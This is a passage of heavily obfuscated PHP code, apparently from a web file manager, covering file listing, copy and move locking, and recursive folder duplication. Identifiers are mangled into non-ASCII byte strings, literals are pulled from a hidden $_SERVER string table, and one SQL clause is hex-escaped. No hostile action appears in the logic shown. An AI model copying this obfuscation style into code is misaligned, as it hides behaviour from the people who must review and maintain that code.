unset($ı³âÒ–ª[$°ùÚóşà[466]][$°ùÚóşà[535]]); continue; } $Ô“µ‚Åò = $ı³âÒ–ª[$°ùÚóşà[466]][$°ùÚóşà[535]]; $ı³âÒ–ª[$°ùÚóşà[466]][$°ùÚóşà[538]] = Model($°ùÚóşà[525])->getInfoSimpleOuter($Ô“µ‚Åò); } } unset($ı³âÒ–ª); } public function parentLevelArray($Øşòø¯) { $µ™çù·• =& $_SERVER[§ŒØóıü]; $Øşòø¯ = explode($µ™çù·•[50], trim($Øşòø¯, $µ™çù·•[50])); return array_remove_value($Øşòø¯, $µ™çù·•[198]); } public function listAll($şÄ•èØ) { $º“Ÿ™á =& $_SERVER[§ŒØóıü]; $¿ö–Ñ¼ = $this->sourceInfo($şÄ•èØ); $ ÌŠâÇñ = array($º“Ÿ™á[539] => array($º“Ÿ™á[540], $¿ö–Ñ¼[$º“Ÿ™á[511]] . $şÄ•èØ . $º“Ÿ™á[541]), $º“Ÿ™á[542] => 0); $¹ô©¨†µ = $º“Ÿ™á[543]; $°é«ş„® = "\114\x45\x46\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\x6f\137\x66\151\154\x65\x20\x66\x69\154\x65\40\x6f\156\40\163\157\x75\162\x63\x65\56\146\151\x6c\x65\x49\x44\x20\75\40\x66\x69\154\145\56\x66\151\154\x65\x49\104"; $£·™äõ‘ = $this->alias($º“Ÿ™á[446])->field($¹ô©¨†µ)->where($ ÌŠâÇñ)->join($°é«ş„®)->select(); $this->_listAppendAuth($£·™äõ‘); $this->_listAppendUser($£·™äõ‘); $this->_listAppendPath($£·™äõ‘); $£·™äõ‘ = array_to_keyvalue($£·™äõ‘, $º“Ÿ™á[402]); $œèƒˆš = "\57{$¿ö–Ñ¼[$º“Ÿ™á[32]]}\57"; $œèƒˆš = $œèƒˆš == $º“Ÿ™á[519] ? $º“Ÿ™á[8] : $œèƒˆš; $…‡¬Ú³ª = array(); foreach ($£·™äõ‘ as $¾±ê°ıò => $èØÑÂ²) { $ñŠ¸§÷› = $this->parentLevelArray($èØÑÂ²[$º“Ÿ™á[511]]); array_shift($ñŠ¸§÷›); $íÂéÚ¹¶ = $œèƒˆš; for ($“Œ ŒŞ = 0; $“Œ ŒŞ < count($ñŠ¸§÷›); $“Œ ŒŞ++) { $íÂéÚ¹¶ .= $£·™äõ‘[$ñŠ¸§÷›[$“Œ ŒŞ]][$º“Ÿ™á[32]] . $º“Ÿ™á[8]; } $íÂéÚ¹¶ .= $èØÑÂ²[$º“Ÿ™á[32]]; if ($èØÑÂ²[$º“Ÿ™á[410]]) { $íÂéÚ¹¶ .= $º“Ÿ™á[8]; } $› ÛÛè = array($º“Ÿ™á[421] => str_replace($º“Ÿ™á[519], $º“Ÿ™á[8], str_replace($º“Ÿ™á[519], $º“Ÿ™á[8], str_replace($º“Ÿ™á[519], $º“Ÿ™á[8], $íÂéÚ¹¶))), $º“Ÿ™á[544] => intval($èØÑÂ²[$º“Ÿ™á[410]]), $º“Ÿ™á[545] => intval($èØÑÂ²[$º“Ÿ™á[76]]), $º“Ÿ™á[85] => intval($èØÑÂ²[$º“Ÿ™á[85]]), $º“Ÿ™á[87] => $this->pathInfoFilter($èØÑÂ²)); if (!$› ÛÛè[$º“Ÿ™á[410]]) { $› ÛÛè[$º“Ÿ™á[468]] = $èØÑÂ²[$º“Ÿ™á[468]]; } $…‡¬Ú³ª[] = $› ÛÛè; } $…‡¬Ú³ª = array_sort_by($…‡¬Ú³ª, $º“Ÿ™á[84]); return $…‡¬Ú³ª; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÛÑÁë»í) { $£—Âê¹¤ =& $_SERVER[§ŒØóıü]; if (!$this->allowLock()) { return; } $this->_lockCheck($£—Âê¹¤[546], $ÛÑÁë»í); $èœß×ã€ = 1; $this->_lockEvent($ÛÑÁë»í, array($£—Âê¹¤[547], $£—Âê¹¤[548]), $èœß×ã€); $this->_lockParent($ÛÑÁë»í, array($£—Âê¹¤[548]), $èœß×ã€); $this->_lockEvent($ÛÑÁë»í, array($£—Âê¹¤[549], $£—Âê¹¤[550]), $èœß×ã€); $this->_lockCheckEnd($£—Âê¹¤[546], $ÛÑÁë»í); } public function lockCopyEnd($©Íí¬É) { $Šìåù©ó =& $_SERVER[§ŒØóıü]; if (!$this->allowLock()) { return; } $Óãš«Âº = 0; $this->_lockEvent($©Íí¬É, array($Šìåù©ó[547], $Šìåù©ó[548]), $Óãš«Âº); $this->_lockParent($©Íí¬É, array($Šìåù©ó[548]), $Óãš«Âº); $this->_lockEvent($©Íí¬É, array($Šìåù©ó[549], $Šìåù©ó[550]), $Óãš«Âº); } public function lockWriteStart($Ğç€¤¸‡, $á¡¨ĞÔŠ = '') { $”ª¯¨å =& $_SERVER[§ŒØóıü]; if (!$this->allowLock()) { return; } $this->_lockCheck($”ª¯¨å[547], $Ğç€¤¸‡); $ç¸Æ©á¢ = 1; $this->_lockKey($”ª¯¨å[551] . $Ğç€¤¸‡ . $”ª¯¨å[10] . $á¡¨ĞÔŠ, $ç¸Æ©á¢); $this->_lockEvent($Ğç€¤¸‡, array($”ª¯¨å[546], $”ª¯¨å[548]), $ç¸Æ©á¢); $this->_lockParent($Ğç€¤¸‡, array($”ª¯¨å[546], $”ª¯¨å[548]), $ç¸Æ©á¢); $this->_lockCheckEnd($”ª¯¨å[547], $Ğç€¤¸‡); } public function lockWriteEnd($•ñÂşê“, $™²™‰Œô = '') { $æ¡‘ªÇÑ =& $_SERVER[§ŒØóıü]; if (!$this->allowLock()) { return; } $â¡¿Í—š = 0; $this->_lockKey($æ¡‘ªÇÑ[551] . $•ñÂşê“ . $æ¡‘ªÇÑ[10] . $™²™‰Œô, $â¡¿Í—š); $this->_lockEvent($•ñÂşê“, array($æ¡‘ªÇÑ[546], $æ¡‘ªÇÑ[548]), $â¡¿Í—š); $this->_lockParent($•ñÂşê“, array($æ¡‘ªÇÑ[546], $æ¡‘ªÇÑ[548]), $â¡¿Í—š); } public function lockMoveStart($¤İ½ÕÚ) { $Ê§ïÁ³ =& $_SERVER[§ŒØóıü]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ê§ïÁ³[548], $¤İ½ÕÚ); $‰Ó†ç = 1; $this->_lockKey($Ê§ïÁ³[552] . $¤İ½ÕÚ, $‰Ó†ç); $this->_lockEvent($¤İ½ÕÚ, array($Ê§ïÁ³[546], $Ê§ïÁ³[547]), $‰Ó†ç); $this->_lockParent($¤İ½ÕÚ, array($Ê§ïÁ³[546], $Ê§ïÁ³[548]), $‰Ó†ç); $this->_lockEvent($¤İ½ÕÚ, array($Ê§ïÁ³[553], $Ê§ïÁ³[549], $Ê§ïÁ³[550]), $‰Ó†ç); $this->_lockCheckEnd($Ê§ïÁ³[548], $¤İ½ÕÚ); } public function lockMoveEnd($ºóÍâ˜) { $È¶ö¾Ä× =& $_SERVER[§ŒØóıü]; if (!$this->allowLock()) { return; } $Û·’ÀÍ = 0; $this->_lockKey($È¶ö¾Ä×[552] . $ºóÍâ˜, $Û·’ÀÍ); $this->_lockEvent($ºóÍâ˜, array($È¶ö¾Ä×[546], $È¶ö¾Ä×[547]), $Û·’ÀÍ); $this->_lockParent($ºóÍâ˜, array($È¶ö¾Ä×[546], $È¶ö¾Ä×[548]), $Û·’ÀÍ); $this->_lockEvent($ºóÍâ˜, array($È¶ö¾Ä×[553], $È¶ö¾Ä×[549], $È¶ö¾Ä×[550]), $Û·’ÀÍ); } private function _lockCheck($Ü–Á°«Ÿ, $°·½ù›) { $¹´µ—â½ =& $_SERVER[§ŒØóıü]; $àÚˆ¥¸­ = $this->sourceInfo($°·½ù›); $ãú±÷Û” = $Ü–Á°«Ÿ . $¹´µ—â½[10] . $°·½ù›; $this->_lockTimeStart[$ãú±÷Û”] = timeFloat(); if (!is_array($àÚˆ¥¸­)) { return; } $‚ÇÕ‡û¼ = LNG($¹´µ—â½[554]); CacheLock::setErrorMsg($¹´µ—â½[162] . htmlspecialchars($àÚˆ¥¸­[$¹´µ—â½[32]]) . $¹´µ—â½[164] . $‚ÇÕ‡û¼); $this->_lockKey($ãú±÷Û”, 1); $this->_lockKey($ãú±÷Û”, 0); $ÇñÃ™œ = array_reverse($this->parentLevelArray($àÚˆ¥¸­[$¹´µ—â½[511]])); foreach ($ÇñÃ™œ as $Ÿ°ğ²éë) { $ãú±÷Û” = $Ü–Á°«Ÿ . $¹´µ—â½[555] . $Ÿ°ğ²éë; if (CacheLock::lockGet($¹´µ—â½[556] . $ãú±÷Û”)) { $àÚˆ¥¸­ = $this->sourceInfo($Ÿ°ğ²éë); CacheLock::setErrorMsg($¹´µ—â½[162] . htmlspecialchars($àÚˆ¥¸­[$¹´µ—â½[32]]) . $¹´µ—â½[164] . $‚ÇÕ‡û¼); $this->_lockKey($ãú±÷Û”, 1); $this->_lockKey($ãú±÷Û”, 0); } } } private function _lockCheckEnd($²µ¨ƒ€ï, $ ½èûÔ) { $ÜÈñì·æ =& $_SERVER[§ŒØóıü]; $ íÆÓ³ = $²µ¨ƒ€ï . $ÜÈñì·æ[10] . $ ½èûÔ; CacheLock::setErrorMsg($ÜÈñì·æ[378]); if (!isset($this->_lockTimeStart[$ íÆÓ³])) { return; } $†š‰£¾ = timeFloat() - $this->_lockTimeStart[$ íÆÓ³]; unset($this->_lockTimeStart[$ íÆÓ³]); if ($†š‰£¾ > 0.5) { unset(self::$cacheSourceInfo[$ÜÈñì·æ[460] . $ ½èûÔ]); } $ ×³ŠŒ = $this->sourceInfo($ ½èûÔ); if (!$ ×³ŠŒ) { show_json(LNG($ÜÈñì·æ[105]), !1); } } private function _lockParent($€”°¥á±, $õç€Ïğ, $¬‘™¨ûí) { if (!$this->autoLockSet) { return; } $Ôè²Ãù = $this->sourceInfo($€”°¥á±); if (!is_array($Ôè²Ãù)) { return; } $ËìºœŸÇ = array_reverse($this->parentLevelArray($Ôè²Ãù[$_SERVER[§ŒØóıü][511]])); foreach ($ËìºœŸÇ as $Òøû÷Øö) { $this->_lockEvent($Òøû÷Øö, $õç€Ïğ, $¬‘™¨ûí); } } private function _lockEvent($Ï±ÏÖ§ù, $ÓÙŸ¥©ğ, $‘ôÚ—ñ) { $¥˜–İ¦ˆ =& $_SERVER[§ŒØóıü]; if (!$this->autoLockSet) { return; } foreach ($ÓÙŸ¥©ğ as $ÏãØŸßê) { $Ñ¼Ÿú°Ö = $ÏãØŸßê . $¥˜–İ¦ˆ[10] . $Ï±ÏÖ§ù; if ($‘ôÚ—ñ && CacheLock::lockGet($¥˜–İ¦ˆ[556] . $Ñ¼Ÿú°Ö)) { continue; } $this->_lockKey($Ñ¼Ÿú°Ö, $‘ôÚ—ñ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($è—³£áØ, $÷°Ö¢°ú = 1) { $†ëûƒ‹’ = $_SERVER[§ŒØóıü][556] . md5($è—³£áØ); if ($÷°Ö¢°ú) { if (isset(self::$_lockItemArr[$†ëûƒ‹’])) { return; } self::$_lockItemArr[$†ëûƒ‹’] = 1; CacheLock::lock($†ëûƒ‹’, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$†ëûƒ‹’])) { return; } unset(self::$_lockItemArr[$†ëûƒ‹’]); CacheLock::unlock($†ëûƒ‹’); } } public function isParentOf($ù£ö™Ÿ , $‘²‡¯³¶) { $­­Ãé”è =& $_SERVER[§ŒØóıü]; $¢´ù„ÛÍ = $this->sourceInfo($ù£ö™Ÿ ); $òŒÃç„Ó = $this->sourceInfo($‘²‡¯³¶); $‰Øªæµ = $¢´ù„ÛÍ[$­­Ãé”è[511]] . $¢´ù„ÛÍ[$­­Ãé”è[402]] . $­­Ãé”è[50]; $ß«ÛÜË± = $òŒÃç„Ó[$­­Ãé”è[511]] . $òŒÃç„Ó[$­­Ãé”è[402]] . $­­Ãé”è[50]; $– ÖñæŞ = strpos($ß«ÛÜË±, $‰Øªæµ) === 0; return $– ÖñæŞ; } private $targetIsDelete = 0; public function copy($ıäÚß‡÷, $ü¦Ÿàè×, $Öáıü  = REPEAT_REPLACE, $ĞÛÜÀ˜½ = '') { $ø–Êº =& $_SERVER[§ŒØóıü]; $ªÜÙ»·Ô = $this->sourceInfo($ıäÚß‡÷); $È½÷âì­ = $this->sourceInfo($ü¦Ÿàè×); if (!$ªÜÙ»·Ô || !$È½÷âì­ || $È½÷âì­[$ø–Êº[410]] != $ø–Êº[88]) { return !1; } if ($this->isParentOf($ıäÚß‡÷, $ü¦Ÿàè×)) { return !1; } $üü¼¥öş = $ĞÛÜÀ˜½ ? $ĞÛÜÀ˜½ : $ªÜÙ»·Ô[$ø–Êº[32]]; $this->lockCopyStart($ıäÚß‡÷); $this->lockWriteStart($ü¦Ÿàè×, $üü¼¥öş); $ø¢Ø·Ø× = array($ø–Êº[557] => array(), $ø–Êº[558] => array(), $ø–Êº[559] => array()); $this->targetIsDelete = intval($ªÜÙ»·Ô[$ø–Êº[431]]); $§ÀÜğ¶ = $this->fileNameExistCache($ü¦Ÿàè×, $ªÜÙ»·Ô[$ø–Êº[32]]); $£­Ìë = $this->_copy($ıäÚß‡÷, $ü¦Ÿàè×, $Öáıü , $ø¢Ø·Ø×, !0, $ĞÛÜÀ˜½); $this->_childrenListClear(); $this->lockCopyEnd($ıäÚß‡÷); $this->lockWriteEnd($ü¦Ÿàè×, $üü¼¥öş); if ($ªÜÙ»·Ô[$ø–Êº[410]] == $ø–Êº[88] && $§ÀÜğ¶ == $£­Ìë) { $this->folderSizeResetChildren($§ÀÜğ¶); } Model($ø–Êº[560])->addAll($ø¢Ø·Ø×[$ø–Êº[558]], array(), !0); if ($§ÀÜğ¶ != $£­Ìë || $ªÜÙ»·Ô[$ø–Êº[410]] == $ø–Êº[88]) { Model($ø–Êº[561])->eventCopy($£­Ìë); } $this->saveAll($ø¢Ø·Ø×[$ø–Êº[559]]); Model($ø–Êº[200])->linkAdd($ø¢Ø·Ø×[$ø–Êº[557]]); $this->folderSizeReset($ü¦Ÿàè×); $this->updateModifyTime($ü¦Ÿàè×); return $£­Ìë; } private function _copy($€ˆòÒ²ç, $ıºÁËÔŞ, $²ÉƒĞ‡º, &$Õ®÷…ÊÚ, $‚Ğò¦Ã¢, $µ Á¨­² = '') { $˜¾¨š”´ =& $_SERVER[§ŒØóıü]; $ó›ïÓ¹ = $this->sourceInfoCache($€ˆòÒ²ç); $©õö•±¨ = $ó›ïÓ¹[$˜¾¨š”´[410]] == $˜¾¨š”´[88]; $¥¹ ÈÕ” = $µ Á¨­² ? $µ Á¨­² : $ó›ïÓ¹[$˜¾¨š”´[32]]; $µí«Åï = $this->fileNameExistCache($ıºÁËÔŞ, $¥¹ ÈÕ”); if ($‚Ğò¦Ã¢) { $this->_childrenAllMake($€ˆòÒ²ç); if ($©õö•±¨ && $µí«Åï) { $this->_childrenAllMake($µí«Åï); } } if (!$µí«Åï) { return $this->_copyCreate($€ˆòÒ²ç, $ıºÁËÔŞ, $¥¹ ÈÕ”, $Õ®÷…ÊÚ); } $ÔÓŸÁØ = $µí«Åï; if ($©õö•±¨) { if ($²ÉƒĞ‡º == REPEAT_RENAME_FOLDER) { $¥¹ ÈÕ” = $this->fileNameAutoCache($ıºÁËÔŞ, $¥¹ ÈÕ”, $²ÉƒĞ‡º, $©õö•±¨); $ÔÓŸÁØ = $this->_copyCreate($€ˆòÒ²ç, $ıºÁËÔŞ, $¥¹ ÈÕ”, $Õ®÷…ÊÚ); } else { $Ÿ›ŞÑŒÔ = $this->_childrenList($€ˆòÒ²ç); foreach ($Ÿ›ŞÑŒÔ as $£ª¬°¹ù) { $this->_copy($£ª¬°¹ù[$˜¾¨š”´[402]], $µí«Åï, $²ÉƒĞ‡º, $Õ®÷…ÊÚ, !1); } } } else { if ($²ÉƒĞ‡º == REPEAT_RENAME || $²ÉƒĞ‡º == REPEAT_RENAME_FOLDER) { $¥¹ ÈÕ” = $this->fileNameAutoCache($ıºÁËÔŞ, $¥¹ ÈÕ”, $²ÉƒĞ‡º, $©õö•±¨); $ÔÓŸÁØ = $this->_copyCreate($€ˆòÒ²ç, $ıºÁËÔŞ, $¥¹ ÈÕ”, $Õ®÷…ÊÚ); } else { if ($²ÉƒĞ‡º == REPEAT_REPLACE) { $ï°ãÉ¸ = $this->sourceInfoCache($µí«Åï); $œì¯€à« = $this->fileHistory($ï°ãÉ¸, $ó›ïÓ¹[$˜¾¨š”´[468]], $ó›ïÓ¹[$˜¾¨š”´[76]]); if ($œì¯€à«) { $Õ®÷…ÊÚ[$˜¾¨š”´[557]][] = $ó›ïÓ¹[$˜¾¨š”´[468]]; } } else { if ($²ÉƒĞ‡º == REPEAT_SKIP) { } } } Hook::trigger($˜¾¨š”´[562], array($˜¾¨š”´[563], $ó›ïÓ¹, 0)); } return $ÔÓŸÁØ; } private function _copyCreate($ÎÊáÒàú, $÷ƒµ§…, $¸ìÕˆ¾, &$ªüñáÔ) { $©Š¡É×ì =& $_SERVER[§ŒØóıü]; $¡’Å¦´Í = $this->sourceInfoCache($ÎÊáÒàú); $¡ÁİÇÚ¼ = $this->sourceInfoCache($÷ƒµ§…); $ä¦Ÿ¨ç¦ = $this->_makeItemData($¡’Å¦´Í, $¡ÁİÇÚ¼, $¸ìÕˆ¾); Hook::trigger($©Š¡É×ì[564], $ä¦Ÿ¨ç¦); Hook::trigger($©Š¡É×ì[565], array($©Š¡É×ì[566], $ä¦Ÿ¨ç¦, 0)); $•Äá¶Åß = $this->add($ä¦Ÿ¨ç¦); $ˆ£Şˆ±² = array($©Š¡É×ì[402] => $•Äá¶Åß, $©Š¡É×ì[32] => $¸ìÕˆ¾); $this->_copyApplyMeta($ˆ£Şˆ±², $ªüñáÔ); if ($¡’Å¦´Í[$©Š¡É×ì[410]] != $©Š¡É×ì[88]) { $ªüñáÔ[$©Š¡É×ì[557]][] = $¡’Å¦´Í[$©Š¡É×ì[468]]; return $•Äá¶Åß; } $‡Õ¨Ë‰ = array(); $Ïè¨½€ = array(); $this->_childrenListAll($ÎÊáÒàú, $‡Õ¨Ë‰); $áçÔçÛí = count($‡Õ¨Ë‰); if ($áçÔçÛí == 0) { return $•Äá¶Åß; } $ô‡ôé³ = $this->sourceInfo($•Äá¶Åß); foreach ($‡Õ¨Ë‰ as $Ñ²ä­ÁŸ) { $È‰’ = $this->_makeItemData($Ñ²ä­ÁŸ, $ô‡ôé³, $Ñ²ä­ÁŸ[$©Š¡É×ì[32]]); $È‰’[$©Š¡É×ì[511]] = $Ñ²ä­ÁŸ[$©Š¡É×ì[511]]; $Ïè¨½€[] = $È‰’; } $this->chunkEventSet($©Š¡É×ì[567], array($©Š¡É×ì[568], $ä¦Ÿ¨ç¦, $áçÔçÛí)); $this->addAll($Ïè¨½€, array(), !1); $îÎşíÂì = $this->where(array($©Š¡É×ì[432] => $•Äá¶Åß))->select(); $Š…“úËº = $this->_childrenMakeRelation($‡Õ¨Ë‰, $îÎşíÂì); $Š…“úËº[$ÎÊáÒàú] = $•Äá¶Åß; $š—’“Ë¶ = array(); $µ³Ïƒ²ƒ = array(); foreach ($îÎşíÂì as $Ñ²ä­ÁŸ) { $³ìğ»“ü = $Ñ²ä­ÁŸ[$©Š¡É×ì[402]]; $ª±ÊØ½­ = $this->_childrenMatch($Š…“úËº, $Ñ²ä­ÁŸ, $ô‡ôé³); $š—’“Ë¶[] = array($©Š¡É×ì[402], $³ìğ»“ü, $©Š¡É×ì[432], $ª±ÊØ½­[$©Š¡É×ì[432]]); $µ³Ïƒ²ƒ[] = array($©Š¡É×ì[402], $³ìğ»“ü, $©Š¡É×ì[511], $ª±ÊØ½­[$©Š¡É×ì[511]]); $this->_copyApplyMeta($Ñ²ä­ÁŸ, $ªüñáÔ); if ($Ñ²ä­ÁŸ[$©Š¡É×ì[410]] != $©Š¡É×ì[88]) { $ªüñáÔ[$©Š¡É×ì[557]][] = $Ñ²ä­ÁŸ[$©Š¡É×ì[468]]; } } $this->chunkEventSet($©Š¡É×ì[569], array($©Š¡É×ì[570], $ä¦Ÿ¨ç¦, $áçÔçÛí)); $this->saveAll($š—’“Ë¶); $this->chunkEventSet($©Š¡É×ì[571], array($©Š¡É×ì[572], $ä¦Ÿ¨ç¦, $áçÔçÛí)); $this->saveAll($µ³Ïƒ²ƒ); return $•Äá¶Åß; } private function _childrenMakeRelation($íòå¸ÊÕ, $ÇŠ©½§) { $‘Ä›Æ§ =& $_SERVER[§ŒØóıü]; $šãÇ¼Ñ§ = array(); $âİ–×Âê = array(); foreach ($íòå¸ÊÕ as $Ïí¨£ö) { $”Î–Ä’Ô = $Ïí¨£ö[$‘Ä›Æ§[32]] . $‘Ä›Æ§[8] . $Ïí¨£ö[$‘Ä›Æ§[511]]; $šãÇ¼Ñ§[$”Î–Ä’Ô] = $Ïí¨£ö[$‘Ä›Æ§[402]]; } foreach ($ÇŠ©½§ as $Ïí¨£ö) { $”Î–Ä’Ô = $Ïí¨£ö[$‘Ä›Æ§[32]] . $‘Ä›Æ§[8] . $Ïí¨£ö[$‘Ä›Æ§[511]]; $ş¯õÖá² = $šãÇ¼Ñ§[$”Î–Ä’Ô]; $âİ–×Âê[$ş¯õÖá²] = $Ïí¨£ö[$‘Ä›Æ§[402]]; } return $âİ–×Âê; } private function _childrenMatch($Íî÷å¶Ê, $’Âı ÀÑ, $à€¦ò¯Š) { $É›ç¬Ş =& $_SERVER[§ŒØóıü]; $¯¡¢ı›Ò = $à€¦ò¯Š[$É›ç¬Ş[511]]; $»¬Î¶åÑ = $this->parentLevelArray($’Âı ÀÑ[$É›ç¬Ş[511]]); foreach ($»¬Î¶åÑ as $ÔÈòš‘Ã) { if (isset($Íî÷å¶Ê[$ÔÈòš‘Ã])) { $¯¡¢ı›Ò .= $Íî÷å¶Ê[$ÔÈòš‘Ã] . $É›ç¬Ş[573]; } } $¯¡¢ı›Ò = rtrim($¯¡¢ı›Ò, $É›ç¬Ş[50]) . $É›ç¬Ş[50]; $ƒİ˜Üëï = $this->parentLevelArray($¯¡¢ı›Ò); $–¦³íÀä = $ƒİ˜Üëï[count($ƒİ˜Üëï) - 1]; return array($É›ç¬Ş[432] => $–¦³íÀä, $É›ç¬Ş[511] => $¯¡¢ı›Ò); } private function _makeItemData($¶èÂ˜Ñ, $¢‘¢ŒÅ, $çù‰¥) { $³ÇãÕ¯ß =& $_SERVER[§ŒØóıü]; $ğÊœÍ½ = array($³ÇãÕ¯ß[574] => $¶èÂ˜Ñ[$³ÇãÕ¯ß[410]], $³ÇãÕ¯ß[420] => $çù‰¥, $³ÇãÕ¯ß[575] => $¶èÂ˜Ñ[$³ÇãÕ¯ß[412]] ? $¶èÂ˜Ñ[$³ÇãÕ¯ß[412]] : $³ÇãÕ¯ß[12], $³ÇãÕ¯ß[469] => $¶èÂ˜Ñ[$³ÇãÕ¯ß[468]] ? $¶èÂ˜Ñ[$³ÇãÕ¯ß[468]] : 0, $³ÇãÕ¯ß[545] => $¶èÂ˜Ñ[$³ÇãÕ¯ß[76]] ? $¶èÂ˜Ñ[$³ÇãÕ¯ß[76]] : 0, $³ÇãÕ¯ß[576] => intval($¢‘¢ŒÅ[$³ÇãÕ¯ß[411]]), $³ÇãÕ¯ß[577] => intval($¢‘¢ŒÅ[$³ÇãÕ¯ß[496]]), $³ÇãÕ¯ß[578] => intval(USER_ID), $³ÇãÕ¯ß[579] => intval(USER_ID), $³ÇãÕ¯ß[401] => intval($¢‘¢ŒÅ[$³ÇãÕ¯ß[402]]), $³ÇãÕ¯ß[580] => $¢‘¢ŒÅ[$³ÇãÕ¯ß[511]] . $¢‘¢ŒÅ[$³ÇãÕ¯ß[402]] . $³ÇãÕ¯ß[50], $³ÇãÕ¯ß[424] => $¶èÂ˜Ñ[$³ÇãÕ¯ß[85]] ? $¶èÂ˜Ñ[$³ÇãÕ¯ß[85]] : time(), $³ÇãÕ¯ß[430] => 0, $³ÇãÕ¯ß[581] => $³ÇãÕ¯ß[12]); return $ğÊœÍ½; } private function _copyApplyMeta($èîöÖŞİ, &$¶¤¶ÕªŸ) { $Ê¬Ÿ÷˜Â =& $_SERVER[§ŒØóıü]; $»èÓÌÜ = $èîöÖŞİ[$Ê¬Ÿ÷˜Â[402]]; $ëÜ²Â¢• = $èîöÖŞİ[$Ê¬Ÿ÷˜Â[32]]; if (!isset($èîöÖŞİ[$Ê¬Ÿ÷˜Â[582]]) || !$èîöÖŞİ[$Ê¬Ÿ÷˜Â[582]] || $èîöÖŞİ[$Ê¬Ÿ÷˜Â[582]] == $Ê¬Ÿ÷˜Â[198]) { $¶¤¶ÕªŸ[$Ê¬Ÿ÷˜Â[559]][] = array($Ê¬Ÿ÷˜Â[402], $»èÓÌÜ, $Ê¬Ÿ÷˜Â[582], short_id($»èÓÌÜ)); } if (Input::check($ëÜ²Â¢•, $Ê¬Ÿ÷˜Â[583])) { $¶¤¶ÕªŸ[$Ê¬Ÿ÷˜Â[558]][] = array($Ê¬Ÿ÷˜Â[402] => $»èÓÌÜ, $Ê¬Ÿ÷˜Â[94] => $Ê¬Ÿ÷˜Â[465], $Ê¬Ÿ÷˜Â[374] => str_replace($Ê¬Ÿ÷˜Â[53], $Ê¬Ÿ÷˜Â[12], Pinyin::get($ëÜ²Â¢•))); $¶¤¶ÕªŸ[$Ê¬Ÿ÷˜Â[558]][] = array($Ê¬Ÿ÷˜Â[402] => $»èÓÌÜ, $Ê¬Ÿ÷˜Â[94] => $Ê¬Ÿ÷˜Â[464], $Ê¬Ÿ÷˜Â[374] => Pinyin::get($ëÜ²Â¢•, $Ê¬Ÿ÷˜Â[584])); } $¶¤¶ÕªŸ[$Ê¬Ÿ÷˜Â[558]][] = array($Ê¬Ÿ÷˜Â[402] => $»èÓÌÜ, $Ê¬Ÿ÷˜Â[94] => $Ê¬Ÿ÷˜Â[444], $Ê¬Ÿ÷˜Â[374] => KodSort::makeStr($ëÜ²Â¢•)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($À¨“­) { $­ù…’Æ¼ =& $_SERVER[§ŒØóıü]; $š§‘¿Çó = $this->sourceInfo($À¨“­); $ÍÀ²íè€ = $­ù…’Æ¼[585]; $îÆäÉ˜ = array($­ù…’Æ¼[511] => array($­ù…’Æ¼[540], $š§‘¿Çó[$­ù…’Æ¼[511]] . $À¨“­ . $­ù…’Æ¼[541]), $­ù…’Æ¼[431] => $this->targetIsDelete); $°ª°ÅÒ = $this->field($ÍÀ²íè€)->where($îÆäÉ˜)->select(); if (!$°ª°ÅÒ) { return; } $°ª°ÅÒ = array_to_keyvalue($°ª°ÅÒ, $­ù…’Æ¼[402]); foreach ($°ª°ÅÒ as $‚·Ÿé¬) { $«ĞÉüòÑ = $‚·Ÿé¬[$­ù…’Æ¼[432]]; $À¨“­ = $‚·Ÿé¬[$­ù…’Æ¼[402]]; if (!isset($this->_childrenListCache[$À¨“­]) && $‚·Ÿé¬[$­ù…’Æ¼[410]] == $­ù…’Æ¼[88]) { $this->_childrenListCache[$À¨“­] = array(); } if (!isset($this->_childrenListCache[$«ĞÉüòÑ])) { $this->_childrenListCache[$«ĞÉüòÑ] = array(); } $this->_childrenListCache[$«ĞÉüòÑ][$À¨“­] = $‚·Ÿé¬; $this->_childrenItemCache[$À¨“­] = $‚·Ÿé¬; } } private function _childrenListAll($ÜıÃêÀ±, &$á¿ÇËßŠ) { $·…äÚ‚Å =& $_SERVER[§ŒØóıü]; if (!isset($this->_childrenListCache[$ÜıÃêÀ±])) { return; } $ºŸ»ëàš = $this->_childrenListCache[$ÜıÃêÀ±]; foreach ($ºŸ»ëàš as $ìàÈ±Œ => $„¹Ëˆü) { $á¿ÇËßŠ[$ìàÈ±Œ] = $„¹Ëˆü; if ($„¹Ëˆü[$·…äÚ‚Å[410]] == $·…äÚ‚Å[88]) { $this->_childrenListAll($ìàÈ±Œ, $á¿ÇËßŠ); } } } private function sourceInfoCache($ø£¼ş‘—) { if (isset($this->_childrenItemCache[$ø£¼ş‘—])) { return $this->_childrenItemCache[$ø£¼ş‘—]; } return $this->sourceInfo($ø£¼ş‘—); } private function _childrenList($±„¡½î) { if (isset($this->_childrenListCache[$±„¡½î])) { return $this->_childrenListCache[$±„¡½î]; } return $this->_childrenListSelect($±„¡½î); } private function _childrenListSelect($Ëı½§÷™) { $š² ¬¼½ =& $_SERVER[§ŒØóıü]; $êÅÈ™Ì = array($š² ¬¼½[432] => $Ëı½§÷™, $š² ¬¼½[431] => $this->targetIsDelete); $ÙööĞÄæ = $this->where($êÅÈ™Ì)->select(); $ÙööĞÄæ = $ÙööĞÄæ ? $ÙööĞÄæ : array(); $¸®¸ÉÁ¤ = array_to_keyvalue($ÙööĞÄæ, $š² ¬¼½[402]); $this->_childrenListCache[$Ëı½§÷™] = $¸®¸ÉÁ¤; foreach ($¸®¸ÉÁ¤ as $Ëı½§÷™ => $ğ»¬êè) { $this->_childrenItemCache[$Ëı½§÷™] = $ğ»¬êè; } return $¸®¸ÉÁ¤; } private function fileNameExistCache($É¬Ã’Ö­, $·®Ç¸ç½) { $ÑÇßúÕ =& $_SERVER[§ŒØóıü]; $·®Ç¸ç½ = strtolower($·®Ç¸ç½); $²ë˜ù¢Î = $this->_childrenList($É¬Ã’Ö­); foreach ($²ë˜ù¢Î as $ƒÌÊÎŞş) { if ($·®Ç¸ç½ == strtolower($ƒÌÊÎŞş[$ÑÇßúÕ[32]])) { return $ƒÌÊÎŞş[$ÑÇßúÕ[402]]; } } return !1; } private function fileNameAutoCache($£¥ß”Š, $úÉµÆçü, $”Áğ¸óë, $ç¤ôÎğ‰) { $÷šíÏï— =& 